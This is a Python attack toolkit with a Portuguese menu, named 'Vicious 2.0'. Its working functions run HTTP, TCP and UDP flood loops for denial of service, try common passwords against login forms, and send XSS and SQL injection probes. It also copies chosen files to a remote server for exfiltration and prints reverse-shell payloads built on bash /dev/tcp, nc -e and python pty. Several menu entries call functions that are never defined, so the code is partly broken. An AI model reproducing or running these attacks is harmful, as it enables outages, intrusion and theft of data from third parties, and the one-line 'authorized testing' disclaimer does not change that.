import socket
import os
import time
import threading
import random
import requests
from colorama import init, Fore
import base64
import hashlib

init(autoreset=True)

# Função para exibir a intro
def intro():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.RED + '''
[+] Iniciando Vicious 2.0...
[+] Carregando módulos...
[+] Pronto para dominar.

[!] Aviso: Esta ferramenta é apenas para fins de teste autorizados!
[!] O uso indevido pode ser ilegal. Você é o único responsável.
''')
    time.sleep(3)

# Funções simples (1-9)

def ip_lookup():
    ip = input(Fore.WHITE + "[+] Digite o IP a ser pesquisado: ")
    response = requests.get(f'https://ipinfo.io/{ip}/json')
    data = response.json()
    print(Fore.GREEN + f"[+] Resultado para {ip}: {data}")

def port_scanner():
    ip = input(Fore.WHITE + "[+] Digite o IP alvo: ")
    ports = [21, 22, 23, 80, 443, 8080]
    print(Fore.YELLOW + "[+] Escaneando portas...")
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            print(Fore.GREEN + f"[+] Porta {port} aberta")
        else:
            print(Fore.RED + f"[-] Porta {port} fechada")
        sock.close()

def http_flood():
    ip = input(Fore.WHITE + "[+] Digite o IP alvo: ")
    url = f"http://{ip}"
    print(Fore.YELLOW + "[+] Iniciando ataque HTTP Flood...")
    while True:
        requests.get(url)

def tcp_flood():
    ip = input(Fore.WHITE + "[+] Digite o IP alvo: ")
    port = 80
    print(Fore.YELLOW + "[+] Iniciando TCP SYN Flood...")
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.sendto(random._urandom(1024), (ip, port))

def brute_force():
    target = input(Fore.WHITE + "[+] Digite o nome de usuário alvo para brute force: ")
    password_list = ['123456', 'password', '12345678', 'qwerty', 'abc123']
    for password in password_list:
        print(Fore.YELLOW + f"[+] Tentando {password} para o usuário {target}")
        time.sleep(1)

def dns_scanner():
    domain = input(Fore.WHITE + "[+] Digite o domínio para realizar o scanner DNS: ")
    print(Fore.YELLOW + "[+] Escaneando DNS...")
    try:
        result = os.system(f"dig {domain}")
        print(Fore.GREEN + f"[+] Resultado do DNS para {domain}: {result}")
    except Exception as e:
        print(Fore.RED + f"[!] Erro ao realizar o scanner DNS: {e}")

def web_crawler():
    url = input(Fore.WHITE + "[+] Digite o URL para realizar o Crawler Web: ")
    print(Fore.YELLOW + "[+] Iniciando Crawler Web...")
    try:
        response = requests.get(url)
        print(Fore.GREEN + f"[+] Links encontrados: {response.text}")
    except Exception as e:
        print(Fore.RED + f"[!] Erro ao realizar Crawler Web: {e}")

def subdomain_recognition():
    domain = input(Fore.WHITE + "[+] Digite o domínio para reconhecimento de subdomínios: ")
    print(Fore.YELLOW + "[+] Reconhecendo subdomínios...")
    try:
        os.system(f"sublist3r -d {domain}")
    except Exception as e:
        print(Fore.RED + f"[!] Erro ao reconhecer subdomínios: {e}")

def hardcore_mode():
    confirm = input(Fore.WHITE + "[!] Tem certeza que quer ativar o Modo Hardcore? (s/n): ")
    if confirm.lower() == 's':
        print(Fore.RED + "[+] Modo Hardcore ativado! Todos os ataques em execução...")
        threading.Thread(target=http_flood).start()
        threading.Thread(target=tcp_flood).start()
        threading.Thread(target=port_scanner).start()
        while True:
            pass
    else:
        print(Fore.RED + "[!] Modo Hardcore cancelado.")

# Funções avançadas (10-25)

def ddos_attack():
    ip = input(Fore.WHITE + "[+] Digite o IP alvo para o ataque DDoS: ")
    port = 80
    print(Fore.YELLOW + "[+] Iniciando ataque DDoS...")
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.sendto(random._urandom(1024), (ip, port))

def udp_flood():
    ip = input(Fore.WHITE + "[+] Digite o IP alvo para o ataque UDP: ")
    port = random.randint(1, 65535)
    print(Fore.YELLOW + "[+] Iniciando Flood UDP...")
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(random._urandom(1024), (ip, port))

def payload_for_exploit():
    print(Fore.YELLOW + "[+] Gerando payload para exploit...")
    payloads = [
        "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')'",
        "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        "nc -e /bin/bash 127.0.0.1 4444"
    ]
    for payload in payloads:
        print(Fore.GREEN + f"[+] Payload gerado: {payload}")

def remote_file_backup():
    remote_ip = input(Fore.WHITE + "[+] Digite o IP remoto para realizar o backup: ")
    remote_path = input(Fore.WHITE + "[+] Digite o caminho do arquivo remoto: ")
    local_path = input(Fore.WHITE + "[+] Digite o caminho local para salvar o backup: ")
    print(Fore.YELLOW + "[+] Realizando backup de arquivo remoto...")
    try:
        os.system(f"scp user@{remote_ip}:{remote_path} {local_path}")
        print(Fore.GREEN + "[+] Backup realizado com sucesso!")
    except Exception as e:
        print(Fore.RED + f"[!] Erro ao realizar backup: {e}")

def network_vulnerability_scanner():
    ip = input(Fore.WHITE + "[+] Digite o IP alvo para scanner de vulnerabilidades de rede: ")
    print(Fore.YELLOW + "[+] Escaneando vulnerabilidades...")
    try:
        os.system(f"nmap -sV {ip}")
    except Exception as e:
        print(Fore.RED + f"[!] Erro ao escanear vulnerabilidades de rede: {e}")

def data_exfiltration():
    file_path = input(Fore.WHITE + "[+] Digite o caminho do arquivo a ser exfiltrado: ")
    server_ip = input(Fore.WHITE + "[+] Digite o IP do servidor para onde os dados serão enviados: ")
    print(Fore.YELLOW + "[+] Exfiltrando dados...")
    try:
        os.system(f"scp {file_path} user@{server_ip}:/tmp")
        print(Fore.GREEN + "[+] Dados exfiltrados com sucesso!")
    except Exception as e:
        print(Fore.RED + f"[!] Erro ao exfiltrar dados: {e}")

def brute_force_http():
    url = input(Fore.WHITE + "[+] Digite a URL para ataque de força bruta HTTP: ")
    username = input(Fore.WHITE + "[+] Digite o nome de usuário: ")
    passwords = ['123456', 'password', '12345678', 'qwerty', 'abc123']
    print(Fore.YELLOW + "[+] Iniciando ataque de força bruta HTTP...")
    for password in passwords:
        response = requests.post(url, data={'username': username, 'password': password})
        if "Login success" in response.text:
            print(Fore.GREEN + f"[+] Senha encontrada: {password}")
            break
        print(Fore.RED + f"[+] Tentando senha: {password}")
        time.sleep(1)

def reverse_payload():
    ip = input(Fore.WHITE + "[+] Digite o IP para conectar o payload reverso: ")
    port = input(Fore.WHITE + "[+] Digite a porta para o payload: ")
    print(Fore.YELLOW + "[+] Gerando payload reverso...")
    payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    print(Fore.GREEN + f"[+] Payload reverso gerado: {payload}")

def xss_attack():
    url = input(Fore.WHITE + "[+] Digite a URL para ataque de XSS: ")
    payload = "<script>alert('XSS')</script>"
    print(Fore.YELLOW + "[+] Realizando ataque de XSS...")
    try:
        response = requests.get(url + f"?input={payload}")
        if 'XSS' in response.text:
            print(Fore.GREEN + "[+] Ataque XSS bem-sucedido!")
        else:
            print(Fore.RED + "[!] Ataque XSS falhou.")
    except Exception as e:
        print(Fore.RED + f"[!] Erro ao realizar ataque XSS: {e}")

def sql_injection():
    url = input(Fore.WHITE + "[+] Digite a URL para realizar a injeção SQL: ")
    payload = "' OR '1'='1"
    print(Fore.YELLOW + "[+] Tentando injeção SQL...")
    try:
        response = requests.get(url + f"?id={payload}")
        if 'SQL' in response.text:
            print(Fore.GREEN + "[+] Injeção SQL bem-sucedida!")
        else:
            print(Fore.RED + "[!] Injeção SQL falhou.")
    except Exception as e:
        print(Fore.RED + f"[!] Erro ao realizar injeção SQL: {e}")

# Função do menu com todas as opções

# Função para o menu
def menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.RED + '''
[1] IP Lookup
[2] Scanner de Portas
[3] HTTP Flood
[4] TCP SYN Flood
[5] Modo Insano (HTTP + SYN + Portscan)
[6] Brute Force
[7] Scanner DNS
[8] Web Crawler
[9] Reconhecimento de Subdomínios
[10] Scanner de Vulnerabilidades
[11] Exfiltração de Dados
[12] Decodificador Base64
[13] Decodificador MD5
[14] Reconhecimento de Web Shell
[15] Scanner de SSL
[16] Sniffer de Pacotes
[17] Ataque XSS
[18] Injeção SQL
[19] Teste de Força Bruta em HTTP
[20] Enviar payload reverso
[21] Scanner de Vulnerabilidades de Redes
[22] Ataque de DDoS
[23] Flood UDP
[24] Payload para Exploit
[25] Backup de Arquivos Remotos
[0] Sair
''')
        choice = input(Fore.WHITE + "[+] Escolha uma opção: ")

        if choice == '1':
            ip_lookup()
        elif choice == '2':
            port_scanner()
        elif choice == '3':
            http_flood()
        elif choice == '4':
            tcp_flood()
        elif choice == '5':
            hardcore_mode()
        elif choice == '6':
            brute_force()
        elif choice == '7':
            dns_scanner()
        elif choice == '8':
            web_crawler()
        elif choice == '9':
            subdomain_recognition()
        elif choice == '10':
            network_vulnerability_scanner()
        elif choice == '11':
            data_exfiltration()
        elif choice == '12':
            base64_decoder()
        elif choice == '13':
            md5_decoder()
        elif choice == '14':
            web_shell_recognition()
        elif choice == '15':
            ssl_scanner()
        elif choice == '16':
            packet_sniffer()
        elif choice == '17':
            xss_attack()
        elif choice == '18':
            sql_injection()
        elif choice == '19':
            brute_force_http()
        elif choice == '20':
            reverse_payload()
        elif choice == '21':
            network_vulnerability_scanner()
        elif choice == '22':
            ddos_attack()
        elif choice == '23':
            udp_flood()
        elif choice == '24':
            payload_for_exploit()
        elif choice == '25':
            remote_file_backup()
        elif choice == '0':
            print(Fore.GREEN + "[+] Saindo...")
            break
        else:
            print(Fore.RED + "[!] Opção inválida.")
            time.sleep(2)

        # Pausar e voltar para o menu apenas quando o usuário pressionar Enter
        input(Fore.WHITE + "\n[+] Pressione Enter para voltar ao menu...")

# Chama a função principal do menu
menu()
